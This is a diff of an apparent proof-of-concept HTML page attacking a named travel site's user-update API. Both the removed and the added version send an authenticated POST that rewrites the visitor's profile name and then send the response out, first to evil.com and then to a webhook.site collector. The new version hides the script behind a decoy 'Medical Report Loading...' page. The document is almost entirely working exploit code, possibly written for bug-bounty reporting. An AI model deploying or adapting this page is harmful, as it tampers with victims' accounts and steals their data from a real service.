@@ -1,27 +1,31 @@
-<script>
-fetch("https://mapi.makemytrip.com/ext/web/pwa/user/update?region=in&currency=inr&user-currency=INR&language=eng", {
-    method: 'POST',
-    credentials: 'include',
-    headers: {
-        'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-        "query": [[{
-            "name": "extendedUser",
-            "values": {
-                "personalDetails": {
-                    "name": {
-                        "firstName": "hacked",
-                        "lastName": "by evil"
-                    }
-                }
-            }
-        }]]
-    })
-})
-.then(response => response.text())
-.then(data => {
-    // Exfiltrate response to your attacker server
-    fetch("https://www.evil.com/log?data=" + btoa(data));
-});
-</script>
+<html>
+    <body>
+        <h1>Medical Report Loading...</h1>
+        <script>
+            fetch("https://mapi.makemytrip.com/ext/web/pwa/user/update?region=in&currency=inr&user-currency=INR&language=eng", {
+                method: 'POST',
+                credentials: 'include',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    "query": [[{
+                        "name": "extendedUser",
+                        "values": {
+                            "personalDetails": {
+                                "name": {
+                                    "firstName": "hacked",
+                                    "lastName": "by evil"
+                                }
+                            }
+                        }
+                    }]]
+                })
+            })
+            .then(response => response.text())
+            .then(data => {
+                fetch("https://webhook.site/d5cb6119-e02e-4635-b237-80b1a0de70b6?data=" + encodeURIComponent(btoa(data)));
+            });
+        </script>
+    </body>
+</html>
